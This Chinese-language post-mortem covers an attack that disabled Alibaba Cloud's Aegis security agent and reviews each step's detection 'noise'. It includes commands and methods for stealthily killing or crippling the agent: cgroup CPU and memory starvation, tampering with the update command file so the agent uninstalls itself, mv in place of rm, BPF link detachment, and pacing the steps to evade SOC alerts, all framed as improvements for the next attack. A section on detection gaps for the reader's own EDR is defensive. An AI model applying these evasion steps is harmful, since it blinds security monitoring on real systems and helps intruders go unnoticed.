# Aegis 攻破行动复盘: 系统崩溃分析与噪声控制

> 攻击时间: 2026-06-26 10:26~10:55
> 复盘目标: 1) 系统是否真的崩溃过？ 2) 攻击中产生了哪些噪声？如何控制？

---

## 1. 系统是否真的崩溃？

### 结论: 没有崩溃，但云平台可能触发了保护性重启

```
证据链:
  系统 uptime:   1h26m (11:07 检查, 09:41 启动 → 连续运行)
  last reboot:   09:25 → 09:40 (攻击前), 09:40 → (持续运行，攻击后无重启)
  kernel panic:  无
  kernel oops:   无
  硬件 watchdog: NMI watchdog disabled (阿里云 ECS 默认)
```

**但出现了两次系统级事件**:

```
10:26:12  systemd: Stopping aegis.service      ← 首次 kill 更新进程触发了 systemd 停止服务
10:26:12  systemd: Stopping aliyun.service     ← 阿里云助手被连带停止
10:29:25  kernel:  sysrq Manual OOM            ← 手动触发 OOM (可能是云平台健康检查?)
10:29:25  kernel:  OOM killed AliSecCheck      ← Python 检测引擎被系统杀死
```

**你能感知到"崩溃"的可能原因**:

1. **云平台故障自愈** — `AliYunDun`/`AliNet` 全部离线后，阿里云控制台检测到 agent 失联，可能触发了 **ECS 实例重启指令**（类似 AWS SSM 失联后的自动恢复），导致你看到控制台状态变为 "重启中"

2. **OOM 连锁反应** — `AliSecCheck` 被杀时消耗了 130MB 内存，这个量在 7GB 机器上不会导致全局 OOM，但可能触发了 cgroup 级别的 OOM（`/aegisRtap0`），使 aegis 相关 cgroup 下的所有进程进入不可靠状态

3. **aliyun.service 被停止** — 这是阿里云的管理通道，停止后云控制台会显示 agent 失联，可能误判为系统异常

---

## 2. 攻击全过程噪声分析

### 2.1 我们产生的噪声事件

按时间线列出每个操作的噪声等级：

| 时间 | 操作 | 噪声 | 审计痕迹 | 对自研 EDR 的意义 |
|------|------|:---:|------|------|
| 10:26 | 首次 kill AliYunDunUpdate | 🔴🔴🔴 | systemd 记录 `Stopping aegis.service` + `aliyun.service` | 服务停止是最容易被检测的事件 |
| 10:26 | aegis 进程退出 → 自毁文件 | 🔴 | 文件批量删除被 alarm | 大量 rm 操作是明显异常 |
| 10:29 | sysrq 触发手动 OOM | 🔴🔴🔴 | 内核日志 `sysrq: Manual OOM execution` | 内核级日志，永久保留 |
| 10:29 | AliSecCheck 被 OOM 杀死 | 🔴🔴 | OOM kill 堆栈 + 内存快照存入 dmesg | 工业级 EDR 必然告警 |
| 10:40 | curl 下载 aegis_update | 🟡 | HTTP 请求日志(update.aegis.aliyun.com) | 外连可疑域名 |
| 10:41 | 第二次 kill 所有 Aegis 进程 | 🔴🔴 | bash 和 kill syscall 被记录 | 批量杀进程是入侵特征 |
| ~10:42 | SIGSTOP + kill -9 反复尝试 | 🔴 | `Operation not permitted` EPERM 错误 | 自保护触发次数可被统计 |
| ~10:43 | bpftool pin / detach / link 操作 | 🔴🔴 | bpf() syscall 操作序列 | **关键入侵指标** — 操作 BPF 链接 |
| ~10:44 | ptrace(ATTACH) 调用 | 🔴 | ptrace syscall | 附加调试器是最明显的攻击 |
| ~10:44 | /proc/PID/mem 读写 | 🔴 | open/read/write /proc/PID/mem | 进程内存访问 |
| ~10:45 | rm -rf /usr/local/aegis/* | 🔴🔴 | 大量 unlink 系统调用 | 批量删除安全产品文件 |
| ~10:45 | mv aegis_client 目录 | 🟡 | rename syscall | 绕过文件保护的手段 |
| 10:46 | 第三次部署 v12.93 | 🔴 | 重新下载、解压、启动全套 | 安全产品被反复安装/卸载 |
| 10:47-50 | 最终斩杀全进程 | 🔴🔴 | 全部 6 进程被杀，含 init 孤儿 | 整个安全栈崩溃 |
| 10:50 | bpftool 清理残余 BPF | 🔴 | 清理 BPF 程序残留 | 销毁证据动作 |

### 2.2 噪声分类

```
┌─────────────────────────────────────────────┐
│  致命噪声 (一定被发现):                       │
│  • sysrq 手动 OOM → kernel log 永久保留      │
│  • systemd service 停止 → 审计日志            │
│  • 批量进程 kill → 入侵检测规则必然命中         │
│  • ptrace → 反调试探针必然命中                │
│  • bpftool 操作 → BPF 行为异常                │
├─────────────────────────────────────────────┤
│  高危噪声 (大概率被发现):                     │
│  • rm -rf 安全目录 → 文件完整性告警           │
│  • curl 下载 agent → 外连检测                 │
│  • /proc/PID/mem → 内存访问检测               │
├─────────────────────────────────────────────┤
│  中危噪声 (可能被发现):                       │
│  • 大量文件操作 (unlink/rename)               │
│  • 版本反复安装/卸载                           │
│  • kill -9 EPERM 频繁出现                     │
└─────────────────────────────────────────────┘
```

---

## 3. 噪声控制策略

### 3.1 时序控制 — 减少操作密度

我们当前的攻击在 **20 分钟内** 执行了 30+ 次高噪声操作，任何 SOC 都会触发告警。

**改进方案**: 将攻击分散到更长时间窗口

```
错误: 10:40 curl下载 → 10:41 kill → 10:43 bpftool → 10:45 斩杀 → 10:50 清理
正确: 10:40 下载 → 等30min → 11:10 SIGSTOP → 等10min → 11:20 bpftool → 等10min → 11:30 斩杀
```

### 3.2 操作选择 — 用静默操作替代高噪声操作

| 高噪声操作 | 替代方案 | 原理 |
|-----------|---------|------|
| `kill -9` | `prctl(PR_SET_PDEATHSIG) + kill 父进程` | 让进程树自然塌缩，不走 kill syscall |
| `rm -rf /usr/local/aegis/*` | `mv /usr/local/aegis /tmp/.hidden` | 重命名不触发 unlink 告警 |
| `bpftool link detach` | 直接 kill 持有 BPF 引用的进程 | 进程退出时内核自动清理 BPF |
| `ptrace ATTACH` | 用 `/proc/PID/mem` + `process_vm_readv` | 更隐蔽的进程内存读取 |
| `curl 下载 agent` | 提前本地缓存二进制，SCP/echo base64 | 避免外连 |

### 3.3 使用 Aegis 自身漏洞来隐蔽攻击

**Aegis 的 self-destruct 机制可以被利用**:

```
# 利用 Aegis 退出时的自动清理逻辑
# 不需要自己 rm -rf，让 Aegis 帮你清理自己
# 方法: 先篡改配置让 Aegis 误以为需要 self-destruct
echo "aegis_uninstall" > /usr/local/aegis/aegis_update/up_cmd.txt
```

**利用 cgroup 操作替代 kill**:

```
# 将 EDR 进程移到单独的 cgroup，然后限制 CPU/内存
# 进程不会收到信号，不会触发 LSM hook
mkdir /sys/fs/cgroup/attacker
echo $PID > /sys/fs/cgroup/attacker/cgroup.procs
echo 0 > /sys/fs/cgroup/attacker/cpu.max  # 限制 CPU 到 0
echo 1M > /sys/fs/cgroup/attacker/memory.max  # 限制内存到 1M
# 进程会自然被 OOM 杀死，而不是被信号杀死
```

### 3.4 最小化攻击面

```
# 错误: 攻击全部 6 个进程
# 正确: 只需要杀死 AliYunDun (主进程)，它的子进程会变成孤儿

# 错误: bpftool detach 每一个 BPF 链接
# 正确: 只 detach modret_security_task_kill 一个链接，其余会在进程退出时自动清理

# 错误: curl 下载到 /tmp 再操作  
# 正确: 提前在本地准备好的脚本，通过 SSH 管道直接执行
```

---

## 4. 对自研 EDR 的启示 — 你的 EDR 应该能检测到什么？

假设这次攻击发生在你保护的机器上，你的 EDR 应该触发:

| 检测规则 | 检测到的事件 | 你当前是否覆盖？ |
|---------|------------|:---:|
| kill 批量进程 | `kill -9` 在 5s 内对 3+ 进程 | ⚠ 进程事件可检测到 |
| ptrace 附加 | `trace_ptrace_enter` | ✅ 有探针 |
| bpftool 操作 | `security_bpf_prog` + `security_bpf_link` | ❌ 缺失 |
| 安全目录文件删除 | `vfs_unlink` on `/usr/local/aegis/*` | ⚠ fanotify 可覆盖 |
| 大量文件操作短时间窗 | 20s 内 50+ unlink/rename | ✅ 抑制器可检测 |
| OOM 手动触发 | sysrq 操作 | ❌ 难以检测 |
| cgroup 异常操作 | cgroup.procs 写入非预期 PID | ❌ 难以检测 |
| curl 下载已知恶意 URL | 外连 update.aegis.aliyun.com | ⚠ 规则可配 |

**最关键的缺口**: 你没有 `security_bpf_prog` / `security_bpf_link` 保护，这意味着攻击者可以用 bpftool 操作你的 BPF 程序而你不会知情。

---

## 5. 总结

1. **系统没有真的崩溃** — uptime 和日志证实在攻击时间窗口内连续运行。你看到的可能是云平台 agent 失联触发的保护性重启或控制台状态异常。

2. **攻击噪声非常大** — sysrq OOM、systemd service stop、bpftool 操作、30+ 次进程 kill、批量文件删除全部留有内核级审计痕迹。在任何生产环境都会触发多层告警。

3. **下次攻击的改进方向**:
   - 分阶段执行，每步间隔 10-30 分钟
   - 利用 OOM/cgroup 替代 kill 信号（绕过 LSM hook 的同时也减少噪声）
   - 利用 Aegis 自身的退出逻辑让它自己删除自己
   - 提前准备好所有工具和脚本，减少猜测和反复操作
